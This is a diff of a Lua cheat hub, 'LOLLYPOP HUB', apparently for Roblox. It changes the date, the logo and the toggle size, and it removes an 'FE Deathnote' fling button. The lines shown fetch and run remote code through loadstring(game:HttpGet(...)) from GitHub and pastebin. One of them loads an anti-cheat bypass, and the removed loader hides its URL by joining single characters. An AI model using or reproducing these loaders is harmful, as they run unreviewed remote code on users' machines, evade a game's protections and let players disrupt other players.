@@ -1,5 +1,5 @@
 --main v9.3.2 LOLLYPOP HUB 
-local LastUpdate="Last Update: Sep 2, 2024";
+local LastUpdate="Last Update: Sep 3, 2024";
 local Vv= [[9.3.2]]
 --=============IMAGE===============--
 getgenv().cheruimg = (17104316554)
@@ -11,8 +11,8 @@ getgenv().nekogirls = (99387651581628)
 getgenv().nekogirlsfull = (129450989114634)
 getgenv().animekatgirl = (18817519330)
 --=========TOGGLE PROPS============--
-getgenv().togglesize = (105)
-getgenv().getImg = (hublogo)
+getgenv().togglesize = (110)
+getgenv().getImg = (lollypopimg)
 pcall(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uwuware/main/skripts/adonisbypass-kredits_pixeluted",true))(); end)
 --===========HUB LOADED============--
@@ -4378,11 +4378,6 @@ FeSection:NewButton("FE Ghost", "fling a player by walking into them", function(
 --WORKS ON R6
 --KREDITS TO THE OWNER
 loadstring(game:HttpGet("https://pastebin.com/raw/uUtRsAX5"))()
-end)
-
-FeSection:NewButton("FE Deathnote (fling)", "fling a player by walking into them", function()
---feDeathnote
-loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'G'..'o'..'K'..'x'..'Y'..'B'..'k'..'U'..'/'..'r'..'a'..'w'), true))()
 end)
 
 FeSection:NewButton("FE bring gui (kollision games only)", "kollision games only", function()
